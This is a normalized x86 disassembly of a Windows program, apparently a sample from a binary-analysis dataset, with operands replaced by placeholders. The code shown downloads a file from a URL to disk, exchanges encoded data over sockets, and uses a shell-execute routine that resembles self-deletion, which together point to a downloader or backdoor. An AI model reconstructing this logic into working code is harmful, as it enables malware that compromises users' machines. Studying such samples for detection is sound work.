or ecx 0xffffffff
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x17c ]
push ecx
push eax
call sub_4029d0
mov esi [ esp + 0x54 ]
add esp 0x40
push 0x1
push ebx
push esi
call [ _lseek@IAT ]
add esp 0xc
cmp ebx [ esp + 0x10 ]
je r-xdata
lea ecx [ esp + 0x13c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x144 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
mov eax [ ebp ]
lea edx [ esp + 0x148 ]
not ecx
dec ecx
push ecx
mov ecx [ eax ]
push edx
push ecx
call sub_4029d0
add esp 0x18
xor eax eax
pop edi
pop ebp
add esp 0x38c
retn 0x4
push esi
call [ _close@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebx
pop edi
pop ebp
add esp 0x38c
retn 0x4
mov edx [ ebp ]
mov ecx 0x4b
xor eax eax
lea edi [ esp + 0x18 ]
[ edi ]
push eax
mov eax [ edx ]
lea ecx [ esp + 0x1c ]
push 0x12c
push ecx
push eax
call sub_402830
add esp 0x10
cmp eax 0xffffffff
je r-xdata
lea edx [ esp + 0x18 ]
mov ecx rw-data
mov dx [ edx ]
cmp dx [ ecx ]
je r-xdata
add ebx eax
push eax
lea eax [ esp + 0x1c ]
push eax
push esi
call [ _write@IAT ]
add esp 0xc
push 0x1
call [ Sleep@IAT ]
cmp ebx [ esp + 0x10 ]
jne r-xdata
sub_402370
mov eax 0x2910
call sub_402df0
push ebx
push esi
push edi
mov ecx 0x10
mov esi rw-data
lea edi [ esp + 0x18 ]
[ edi ] [ esi ]
mov ecx 0x31
xor eax eax
lea edi [ esp + 0x58 ]
xor esi esi
[ edi ]
push rw-data
mov [ esp + 0x10 ] esi
call [ LoadLibraryA@IAT ]
mov edi eax
push rw-data
push edi
call [ GetProcAddress@IAT ]
push edi
mov ebx eax
call [ FreeLibrary@IAT ]
push esi
push esi
push esi
lea eax [ esp + 0x24 ]
push esi
push eax
call ebx
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ esp + 0x2920 ]
push ebp
push 0x0
push 0x84000100
push 0x0
push 0x0
push ecx
push edi
call [ InternetOpenUrlA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
add esp 0x2910
retn
mov edx [ esp + 0x2928 ]
push rw-data
push edx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
mov ecx 0xa00
xor eax eax
lea edi [ esp + 0x120 ]
mov ebp [ InternetReadFile@IAT ]
[ edi ]
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x120 ]
push eax
push 0x2800
push ecx
push ebx
call ebp
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x4
jmp r-xdata
mov ebp [ InternetCloseHandle@IAT ]
test ebx ebx
je r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
mov eax [ esp + 0x18 ]
push esi
test eax eax
je r-xdata
push edi
call ebp
test esi esi
pop ebp
je r-xdata
push ebx
call ebp
mov edi [ esp + 0x14 ]
call [ fclose@IAT ]
add esp 0x4
push eax
lea edx [ esp + 0x128 ]
push 0x1
push edx
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
mov ecx 0xa00
xor eax eax
lea edi [ esp + 0x134 ]
add esp 0x14
[ edi ]
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x120 ]
push eax
push 0x2800
push ecx
push ebx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
add esp 0x2910
retn
push esi
call [ fclose@IAT ]
add esp 0x4
sub_402500
sub esp 0x310
push ebx
push ebp
push esi
push edi
push 0x208
call [ malloc@IAT ]
mov ebx eax
mov ecx 0x82
xor eax eax
mov edi ebx
[ edi ]
mov edi [ esp + 0x330 ]
add esp 0x4
push edi
call [ lstrlenA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x118 ]
push 0x104
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x118 ]
push edx
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push rw-data
and ecx 0x3
[ edi ] [ esi ]
mov esi [ sscanf@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
call esi
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea edx [ ebx + 0x104 ]
push edx
push rw-data
lea eax [ esp + ecx + 0x1d ]
push eax
call esi
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x310
retn 0x10
lea eax [ esp + 0x21c ]
push 0x104
push eax
push 0x1
push esi
call [ LoadStringA@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push ebx
push sub_401410
push 0x0
push 0x0
mov [ esp + 0x28 ] 0x0
call [ CreateThread@IAT ]
mov esi eax
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push esi
call [ GetExitCodeThread@IAT ]
mov edx [ esp + 0x10 ]
push edx
push esi
call [ TerminateThread@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x21c ]
push ecx
push edx
call sub_402aa0
add esp 0x8
push esi
call [ FreeLibrary@IAT ]
mov ebp [ strchr@IAT ]
lea eax [ esp + 0x14 ]
push 0x3a
push eax
call ebp
add esp 0x8
test eax eax
je r-xdata
call sub_4026d0
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
push 0x3a
[ edi ]
not ecx
sub edi ecx
push ebx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ebp
mov [ eax ] 0x0
lea eax [ esp + 0x1c ]
push 0x3a
push eax
call ebp
mov edi eax
add esp 0x10
inc edi
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x104 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_4026d0
sub esp 0x348
lea eax [ esp + 0x3c ]
push ebx
push ebp
push esi
push edi
push 0x104
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x348
retn
lea ecx [ esp + 0x4c ]
push 0x104
lea edx [ esp + 0x50 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x254 ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x4c ]
lea eax [ esp + 0x150 ]
push edx
push eax
call esi
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call esi
mov [ esp + 0x18 ] edi
lea edx [ esp + 0x254 ]
lea eax [ esp + 0x150 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ esp + 0x14 ] 0x3c
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x18 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
mov ebp [ SetThreadPriority@IAT ]
push eax
call ebp
lea ecx [ esp + 0x10 ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call ebp
mov edx [ esp + 0x48 ]
push 0x40
push edx
call esi
mov eax [ esp + 0x48 ]
push 0x1
push eax
call [ SetProcessPriorityBoost@IAT ]
lea ecx [ esp + 0x4c ]
push 0x0
push ecx
push 0x1
push 0x4
call [ SHChangeNotify@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x348
retn
sub_402830
mov eax [ esp + 0xc ]
sub esp 0x4bc
mov ecx 0x3
push ebp
push esi
mov esi eax
push edi
cdq
idiv ecx
test edx edx
je r-xdata
mov ecx 0x64
xor eax eax
lea edi [ esp + 0xc ]
mov ebp [ esp + 0x4cc ]
[ edi ]
stosb [ edi ]
lea ecx [ esi * 4 ]
mov eax 0x55555556
imul ecx
mov edi [ esp + 0x4d8 ]
mov eax edx
shr eax 0x1f
add edx eax
push edi
lea ecx [ esp + 0x10 ]
push edx
push ecx
push ebp
call recv
mov esi eax
cmp esi 0xffffffff
jne r-xdata
inc esi
mov ecx 0x3
mov eax esi
cdq
idiv ecx
test edx edx
jne r-xdata
mov edx esi
and edx 0x80000003
jns r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x4bc
retn
je r-xdata
dec edx
or edx 0xfffffffc
inc edx
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
xor esi esi
xor ebp ebp
xor edx edx
[ edi ]
not ecx
dec ecx
je r-xdata
push edi
lea eax [ esp + esi + 0x10 ]
push 0x1
push eax
push ebp
call recv
cmp eax 0xffffffff
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
add esp 0x4bc
retn
push ebx
lea ebx [ esp + 0x1a4 ]
dec ebx
add esi eax
mov ecx esi
and ecx 0x80000003
jns r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebp ecx
jne r-xdata
lea ecx [ esp + 0x338 ]
lea edx [ esp + 0x1a4 ]
push ecx
push edx
call sub_402d00
mov eax [ esp + 0x4e0 ]
mov ecx [ esp + 0x4dc ]
sub eax esi
push eax
lea edx [ esi + ecx ]
lea eax [ esp + 0x344 ]
push edx
push eax
call sub_4011d0
add esp 0x14
add esi eax
xor edx edx
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ esp + ebp + 0x10 ]
add ebp 0x4
mov [ esp + edx + 0x1a4 ] eax
add edx 0x4
mov [ esp + edx + 0x1a4 ] 0x0
mov al [ ebx + edx ]
cmp al 0x40
jne r-xdata
test edx edx
pop ebx
je r-xdata
lea ecx [ esp + 0x334 ]
lea edx [ esp + 0x1a0 ]
push ecx
push edx
call sub_402d00
mov eax [ esp + 0x4dc ]
lea edx [ esp + 0x33c ]
sub eax esi
push eax
mov eax [ esp + 0x4dc ]
lea ecx [ esi + eax ]
push ecx
push edx
call sub_4011d0
add esp 0x14
add esi eax
sub_4029d0
sub esp 0x648
mov ecx 0xc8
xor eax eax
mov edx [ esp + 0x650 ]
push ebx
push ebp
push esi
push edi
lea edi [ esp + 0x334 ]
push 0x321
[ edi ]
stosb [ edi ]
mov ecx 0xc8
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov ecx [ esp + 0x668 ]
stosb [ edi ]
lea eax [ esp + 0x338 ]
push eax
push ecx
push edx
call sub_401000
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x344 ]
push eax
push ecx
call sub_402c20
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov ebx [ esp + 0x668 ]
mov ebp [ esp + 0x65c ]
not ecx
dec ecx
push ebx
mov edi ecx
lea edx [ esp + 0x14 ]
push edi
push edx
push ebp
call send
mov esi eax
cmp esi 0xffffffff
jne r-xdata
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x648
retn
mov eax [ esp + 0x664 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x648
retn
push ebx
lea eax [ esp + esi + 0x14 ]
push 0x1
push eax
push ebp
call send
cmp eax 0xffffffff
je r-xdata
add esi eax
cmp esi edi
jne r-xdata
sub_402aa0
sub esp 0x188
push ebx
push ebp
push esi
push edi
mov ecx 0x16
mov esi rw-data
lea edi [ esp + 0x3c ]
mov al [ rw-data ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x20 ]
mov [ esp + 0x98 ] al
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x99 ]
mov edx [ esp + 0x19c ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi edx
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x1a0 ]
[ edi ]
not ecx
sub edi ecx
xor ebx ebx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x1c ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
mov [ esp + 0x14 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x188
retn
mov esi ebp
mov ebp [ strchr@IAT ]
sub esi edx
mov edi edx
mov [ esp + 0x10 ] esi
movsx ecx al
lea edx [ esp + 0x3c ]
push ecx
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
mov [ esi + edi ] 0x20
jmp r-xdata
mov edx [ esp + 0x19c ]
lea ecx [ esp + 0x98 ]
movsx eax [ ebx + edx ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
mov edx [ esp + 0x1ac ]
add esp 0xc
xor al al
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
pop ebx
add esp 0x188
retn
movsx eax [ edi ]
lea ecx [ esp + 0x3c ]
push eax
push ecx
call ebp
mov esi eax
lea edx [ esp + 0x44 ]
mov eax ebx
sub esi edx
cdq
idiv [ esp + 0x24 ]
lea ecx [ esp + 0x44 ]
movsx eax [ esp + edx + 0x28 ]
push eax
push ecx
call ebp
lea edx [ esp + 0x4c ]
add esp 0x10
sub edx eax
add esi edx
jns r-xdata
inc ebx
inc edi
cmp ebx ecx
jl r-xdata
mov ecx [ esp + 0x10 ]
mov al [ esp + esi + 0x3c ]
mov esi [ esp + 0x10 ]
mov [ ecx + edi ] al
mov ecx [ esp + 0x14 ]
add esi [ esp + 0x18 ]
mov al [ edi ]
cmp al 0x25
jne r-xdata
sub_402c20
sub esp 0xc
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x8 ] ecx
or ecx 0xffffffff
[ edi ]
mov edx [ esp + 0x14 ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x4 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0x14 ] ecx
jle r-xdata
mov ecx [ esp + 0x18 ]
mov [ edi + ecx ] 0x0
mov edx [ rw-data ]
lea eax [ edx + edi ]
pop edi
cdq
idiv [ esp ]
mov [ rw-data ] edx
mov eax edx
add esp 0xc
retn
push ebx
mov ebx [ esp + 0x1c ]
sub edx ebx
push ebp
mov ebp [ strchr@IAT ]
push esi
mov [ esp + 0x18 ] edx
movsx eax al
push eax
push rw-data
call ebp
mov ecx [ rw-data ]
mov esi eax
sub esi rw-data
lea eax [ ecx + edi ]
cdq
idiv [ esp + 0x18 ]
movsx edx [ edx + rw-data ]
push edx
push rw-data
call ebp
sub esi rw-data
add esp 0x10
add eax esi
mov ecx [ esp + 0x20 ]
cdq
idiv [ esp + 0x14 ]
mov al [ edx + rw-data ]
mov edx [ esp + 0x18 ]
mov [ ebx ] al
mov [ ebx ] 0x40
jmp r-xdata
mov al [ edx + ebx ]
cmp al 0x3d
jne r-xdata
pop esi
pop ebp
pop ebx
inc edi
inc ebx
cmp edi ecx
jl r-xdata
sub_402d00
sub esp 0x8
push ebp
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x14 ]
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x8 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0x14 ] ecx
jle r-xdata
mov eax [ esp + 0x18 ]
mov [ edi + eax ] 0x0
mov ecx [ rw-data ]
lea eax [ ecx + edi ]
pop edi
cdq
idiv [ esp + 0x4 ]
pop ebp
mov [ rw-data ] edx
mov eax edx
add esp 0x8
retn
push ebx
mov ebx [ esp + 0x1c ]
sub edx ebx
push esi
mov [ esp + 0x14 ] edx
movsx eax al
push eax
push rw-data
call [ strchr@IAT ]
mov ecx [ rw-data ]
mov esi eax
sub esi rw-data
lea eax [ ecx + edi ]
cdq
idiv [ esp + 0x18 ]
movsx edx [ edx + rw-data ]
push edx
push rw-data
call [ strchr@IAT ]
lea ecx [ esi + ebp + rw-data ]
add esp 0x10
sub ecx eax
mov eax ecx
mov ecx [ esp + 0x1c ]
cdq
idiv ebp
mov dl [ edx + rw-data ]
mov [ ebx ] dl
mov edx [ esp + 0x14 ]
mov [ ebx ] 0x3d
jmp r-xdata
mov al [ edx + ebx ]
cmp al 0x40
jne r-xdata
pop esi
pop ebx
inc edi
inc ebx
cmp edi ecx
jl r-xdata
sub_402df0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402f9f
cmp [ rw-data ] ebx
jne r-xdata
call sub_402f8a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402f9c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402500
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sub_402f71
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402f8a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402f9c
xor eax eax
retn
sub_402f9f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
closesocket
jmp [ closesocket@IAT ]
shutdown
jmp [ shutdown@IAT ]
connect
jmp [ connect@IAT ]
setsockopt
jmp [ setsockopt@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
htons
jmp [ htons@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
recv
jmp [ recv@IAT ]
send
jmp [ send@IAT ]
